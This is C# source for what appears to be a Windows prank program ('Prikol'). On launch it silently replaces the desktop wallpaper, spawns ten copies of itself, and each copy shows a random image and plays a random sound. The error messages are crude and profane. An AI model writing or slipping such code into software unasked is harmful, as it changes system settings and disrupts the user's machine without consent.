using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Prikol
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        static int arg;

        public Form1(int _arg)
        {
            InitializeComponent();
            arg = _arg;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (arg == 0)
            {
                ChangeWallpaper();
                for (var i = 0; i < 10; i++) Process.Start(new ProcessStartInfo()
                {
                    FileName = $"{Application.ExecutablePath}",
                    Arguments = "1"
                });
                Close();
            }
            else
            {
                
                SetImageOnWindow();
                PlayMusic();
            }
        }

        void SetImageOnWindow()
        {
            try
            {
                Bitmap[] images = new Bitmap[]
                {
                    Resource1._1,
                    Resource1._2,
                    Resource1._3,
                    Resource1._4,
                    Resource1._5,
                    Resource1._6,
                    Resource1._7,
                    Resource1._8,
                };

                pictureBox1.Image = images[new Random(Guid.NewGuid().GetHashCode()).Next(0, images.Length)];
            }
            catch
            {
                MessageBox.Show("Idid nahui");
            }
        }

        void PlayMusic()
        {
            try
            {
                var numToAudio = new Dictionary<int, UnmanagedMemoryStream>()
                {
                    {0, Resource1.topAudio},
                    {1, Resource1.topAudio1},
                    {2, Resource1.topAudio2},
                    {3, Resource1.topAudio3},
                    {4, Resource1.topAudio4},
                    {5, Resource1.topAudio5},
                    {6, Resource1.topAudio6},
                    {7, Resource1.topAudio7}
                };
                using (var s = numToAudio[new Random(Guid.NewGuid().GetHashCode()).Next(0, numToAudio.Count)])
                    new SoundPlayer(s).Play();
            }
            catch
            {
                MessageBox.Show("Idid nahui");
            }
        }

        void ChangeWallpaper()
        {
            try
            {
                var path = @"C:\ProgramData\Walp.png";

                Resource1.Walp.Save(path);

                const int SPI_SETDESKWALLPAPER = 0x0014;
                const int SPIF_UPDATEINIFILE = 0x01;
                const int SPIF_SENDCHANGE = 0x02;

                int result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

                if (result == 0)
                {
                    MessageBox.Show("YUI", "Failed to change fuck you!!!!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            catch
            {
                MessageBox.Show("Idid nahui");
            }
        }
    }
}
